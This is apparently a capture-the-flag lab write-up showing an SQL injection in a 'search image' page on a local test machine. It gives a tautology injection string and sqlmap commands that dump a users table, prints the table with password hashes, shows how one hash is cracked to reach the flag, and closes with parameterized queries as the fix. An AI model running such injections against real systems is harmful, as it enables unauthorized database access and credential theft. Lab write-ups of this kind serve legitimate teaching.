VULNERABILTY__
   => Search member tag, is vulnerable to sql injection.


EXPLOIT_?
    step1 ) => see if the sight reposnds to an SQL Injection
    nu typing  [ 1 or 1 = 1], in the search bar and then press Enter.

    step 2) => if the page returns information about an image,
        open terminal, copy the URL and paste in sqlmap
        like so,

        sqlmap -u "http://192.168.8.6/?page=searchimg&id=1+or+1+%3D+1&Submit=Submit#" --tables

        => this should return the schema's of the database.
        => then 

        sqlmap -u "http://192.168.8.6/?page=searchimg&id=1+or+1+%3D+1&Submit=Submit#" --dump -T users

        ^ should retune the table:
        
 ```bash       
Database: Member_Sql_Injection
Table: users
[4 entries]
+---------+-----------+--------+-----------+-----------+----------------+-------------------------------------------------------------------------------+----------------------------------+
| user_id | town      | planet | country   | last_name | first_name     | Commentaire                                                                   | countersign                      |
+---------+-----------+--------+-----------+-----------+----------------+-------------------------------------------------------------------------------+----------------------------------+
| 1       | Honolulu  | EARTH  | America   | Obama     | Barack Hussein | Amerca !                                                                      | 2b3366bcfd44f540e630d4dc2b9b06d9 |
| 2       | Berlin    | Earth  | Allemagne | Hitler    | Adolf          | Ich spreche kein Deutsch.                                                     | 60e9032c586fb422e2c16dee6286cf10 |
| 3       | Moscou    | Earth  | Russia    | Staline   | Joseph         | ????? ????????????? ?????????                                                 | e083b24a01c483437bcf4a9eea7c1b4d |
| 5       | 42        | 42     | 42        | GetThe    | Flag           | Decrypt this password -> then lower all the char. Sh256 on it and it's good ! | 5ff9d0165b4f92b14994e5c685cdce28 |
+---------+-----------+--------+-----------+-----------+----------------+-------------------------------------------------------------------------------+----------------------------------+
```

    => copy and paste " 5ff9d0165b4f92b14994e5c685cdce28" on  "https://www.md5online.org/md5-decrypt.html" to get
    a decoded string i.e "fortytwo", then then type "fortytwo" in "https://passwordsgenerator.net/sha256-hash-generator/"
    to get the Flag "10A16D834F9B1E4068B25C4C46FE0284E99E44DCEAF08098FC83925BA6310FF5"

```bash
 5ff9d0165b4f92b14994e5c685cdce28 => FortyTwo => fortytwo => 10A16D834F9B1E4068B25C4C46FE0284E99E44DCEAF08098FC83925BA6310FF5
 ```

SOLUTION:
```bash
    Use SQL Parameters (parametized Queries)
     for Protection e.g txtNam = getRequestString("CustomerName");
                        txtAdd = getRequestString("Address");
                        txtCit = getRequestString("City");
                        txtSQL = "INSERT INTO Customers (CustomerName,Address,City) Values(@0,@1,@2)";
                        db.Execute(txtSQL,txtNam,txtAdd,txtCit);
                        ```

    => use prepared statements  and  stored procedure                              
  